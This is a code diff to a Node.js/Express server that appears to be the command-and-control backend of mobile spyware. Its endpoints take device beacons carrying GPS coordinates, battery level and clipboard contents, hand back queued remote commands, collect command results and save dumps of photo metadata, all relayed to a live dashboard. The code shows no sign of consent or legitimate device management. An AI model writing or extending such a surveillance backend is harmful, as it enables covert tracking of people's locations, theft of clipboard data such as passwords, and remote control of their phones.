@@ -101,23 +101,39 @@ function updateDeviceStatus(device) {
 // POST /api/beacon — receive device beacon
 app.post('/api/beacon', (req, res) => {
     try {
-        const { deviceId, deviceName, model, osVersion, battery, lat, lng, clipboard } = req.body;
+        const body = req.body;
+        const deviceId = body.deviceId;
 
         if (!deviceId) {
             return res.status(400).json({ error: 'deviceId required' });
         }
 
+        // Accept both iOS naming (batteryLevel/latitude/longitude) and legacy (battery/lat/lng)
+        const deviceName = body.deviceName || '';
+        const model = body.model || '';
+        const osVersion = body.osVersion || '';
+        const battery = body.batteryLevel ?? body.battery ?? 0;
+        const lat = body.latitude ?? body.lat ?? 0;
+        const lng = body.longitude ?? body.lng ?? 0;
+        const clipboard = body.clipboard || '';
+
         const device = db.upsertDevice({ deviceId, deviceName, model, osVersion, battery, lat, lng, clipboard });
         db.logBeacon({ deviceId, battery, lat, lng, clipboard });
 
         const pending = db.getPendingCommands(deviceId);
+        // Parse params from JSON string back to object before sending
+        const parsedCommands = pending.map(cmd => {
+            let params = cmd.params;
+            try { params = JSON.parse(params); } catch(e) {}
+            return { id: cmd.id, type: cmd.type, ...params };
+        });
         pending.forEach(cmd => db.markCommandSent(cmd.id));
 
         broadcast({ type: 'beacon', device: updateDeviceStatus(device) });
 
         console.log(`[BEACON] ${deviceName || deviceId} | Battery: ${battery}% | Lat: ${lat} Lng: ${lng}`);
 
-        res.json({ status: 'ok', commands: pending });
+        res.json({ status: 'ok', commands: parsedCommands });
     } catch (err) {
         console.error('[BEACON] Error:', err.message);
         res.status(500).json({ error: err.message });
@@ -293,6 +309,50 @@ app.get('/api/commands/:deviceId', (req, res) => {
         const commands = db.getCommands(req.params.deviceId);
         res.json(commands);
     } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// POST /api/command/result — receive command execution results from device
+app.post('/api/command/result', (req, res) => {
+    try {
+        const { deviceId, commandId, status } = req.body;
+        if (!commandId) {
+            return res.status(400).json({ error: 'commandId required' });
+        }
+
+        const result = JSON.stringify(req.body);
+        db.markCommandCompleted(commandId, result);
+
+        broadcast({ type: 'command_result', deviceId, commandId, status, result: req.body });
+
+        console.log(`[CMD_RESULT] ${deviceId} | cmd ${commandId} -> ${status}`);
+
+        res.json({ status: 'ok' });
+    } catch (err) {
+        console.error('[CMD_RESULT] Error:', err.message);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// POST /api/upload/metadata — receive photo metadata dump
+app.post('/api/upload/metadata', (req, res) => {
+    try {
+        const { deviceId, metadata } = req.body;
+        if (!deviceId) {
+            return res.status(400).json({ error: 'deviceId required' });
+        }
+
+        const metaFile = path.join(uploadsDir, `metadata_${deviceId}.json`);
+        fs.writeFileSync(metaFile, JSON.stringify(metadata, null, 2));
+
+        broadcast({ type: 'metadata', deviceId, count: Array.isArray(metadata) ? metadata.length : 0 });
+
+        console.log(`[METADATA] ${deviceId} uploaded ${Array.isArray(metadata) ? metadata.length : 0} photo metadata entries`);
+
+        res.json({ status: 'ok' });
+    } catch (err) {
+        console.error('[METADATA] Error:', err.message);
         res.status(500).json({ error: err.message });
     }
 });
